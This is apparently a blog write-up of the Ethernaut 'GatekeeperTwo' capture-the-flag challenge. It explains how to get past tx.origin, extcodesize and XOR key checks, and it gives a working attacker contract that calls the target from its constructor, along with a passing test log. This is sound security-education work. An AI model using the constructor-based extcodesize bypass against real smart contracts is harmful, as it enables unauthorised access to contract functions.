###########################
Ethernaut 14: GatekeeperTwo
###########################
:date: 2023-09-03
:slug: ethernaut-14-GatekeeperTwo
:summary: Content Warning: Yellowpaper
:tags: 
:author: capu
:featured_image:


Objective
=========
Get past the three gatekeepers and register as the ``entrant``.

Code
====
.. code-block:: solidity
    :linenos: inline

    contract GatekeeperTwo {
        address public entrant;

        modifier gateOne() {
            require(msg.sender != tx.origin);
            _;
        }

        modifier gateTwo() {
            uint256 x;
            assembly {
                x := extcodesize(caller())
            }
            require(x == 0);
            _;
        }

        modifier gateThree(bytes8 _gateKey) {
            require(
                uint64(bytes8(
                    keccak256(abi.encodePacked(msg.sender))
                ))
                    ^ uint64(_gateKey)
                == type(uint64).max
            );
            _;
        }

        function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
            entrant = tx.origin;
            return true;
        }
    }

Solution
========

gateOne
-------

.. code-block:: solidity

    tx.origin != msg.sender

This is simiar to the Telephone challenge, just calling from a contract gets us
through the gate.

gate two
--------

.. code-block:: solidity

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

This makes sure the caller has a code size of zero. I could call from an EOA,
but that'd break gate one.

Initially, I read the following in Solidity's docs:

    selfdestruct(address payable recipient)
        Destroy the current contract, sending its funds to the given Address and end
        execution. Note that selfdestruct has some peculiarities inherited from the EVM:
        the receiving contract’s receive function is not executed.
        **the contract is only really destroyed at the end of the transaction** and reverts might “undo” the destruction.

(emphasis mine)

So I tried to first selfdestruct the caller contract and then call the
Gatekeeper: 

.. code-block:: solidity

    function attack(GatekeeperTwo target) {
        selfdestruct(msg.sender);
        target.enter(bytes8(0));
    }

my idea being:

- the contract is marked for destruction
- then an external call is made to the GatekeeperTwo
- in the external call, the codesize of the calling contract is zero

but the result was simply that the GatekeeperTwo was not called 🙃. Destructing
the contract finished the internal transaction, similar to a return.

.. note::

    this is the kind of error solhint (currently) doesn't report, but slither
    does

I wasn't able to walk around gate two, but the challenge has a tip:

    The extcodesize call in this gate will get the size of a contract's code at a
    given address - you can learn more about how and when this is set in section 7
    of the yellow paper.

So I had to dive into the yellowpaper. Don't worry, you won't have to: The
takeaway is that the codesize for an account is set at the end of the creation
transaction, and is zero before that.

Looking into `how contracts are actually deployed
<{filename}/2023-04-24-evm-puzzles-2.rst>`_ , it makes sense, since it's the
return value of the code executed by CREATE what's saved as the contract code,
and therefore is not possible to know the size of that when execution hasn't yet
returned.

The solution then, is to call the ``enter``  method from the attacker's
constructor.

.. code-block:: solidity

    constructor(GatekeeperTwo target) {
        target.enter(bytes8(0));
    }

gate three
----------

.. code-block:: solidity
    :linenos: inline
    :hl_lines: 3 4 5

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint64(bytes8(
                keccak256(abi.encodePacked(msg.sender))
            )) // A
                ^ uint64(_gateKey) // B
            == type(uint64).max// C
        );
        _;
    }

this is again easy to do from solidity since I can simply perform the same
operations on the attacker contract, and, taking advantage of the fact that
XORing (``^``) is its own inverse:

.. code-block:: plain

    A ^ B == C
    =>
    A ^ C == B

let's compute the first part (highlighted), ``A``: 

.. code-block:: solidity

    uint64 left = uint64(bytes8(
        keccak256(abi.encodePacked(address(this)))
    ));

and XOR it with the result we want, ``C``, to get ``B``:

.. code-block:: solidity

        uint64 key = left ^ (type(uint64).max);

Lastly, stitch the whole thing together:

.. code-block:: solidity

    contract Caller {
        constructor(GatekeeperTwo target) {
            uint64 left = uint64(bytes8(
                keccak256(abi.encodePacked(address(this)))
            ));
            uint64 key = left ^ (type(uint64).max);
            target.enter(bytes8(key));
        }
    }
    function solution(address payable target_) internal override{
        GatekeeperTwo target = GatekeeperTwo(target_);
        new Caller(target);
    }

.. code-block:: plain

    Running 1 test for test/14-GatekeeperTwo.t.sol:GatekeeperTwoSolution
    [PASS] testSolution() (gas: 1695202)
    Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.65ms
    Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)

😎
